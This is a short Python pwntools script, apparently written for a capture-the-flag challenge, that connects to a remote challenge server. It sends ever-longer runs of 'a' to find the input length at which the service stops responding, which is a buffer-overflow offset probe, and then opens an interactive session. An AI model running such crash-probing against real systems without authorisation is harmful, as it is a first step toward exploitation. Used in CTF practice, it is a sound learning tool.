from pwn import *

target = remote('0.cloud.chals.io', 21978)

print(target.recvuntil(b'Would you like another push (Y/*) >>>'))
i = 1
while True:
    
    target.sendline(b'a' * i)
    print(i)
    result = (target.recvuntil(b'Would you like another push (Y/*) >>>', timeout=1))
    if not result:
        print(i)
        break
    i += 1

target.interactive()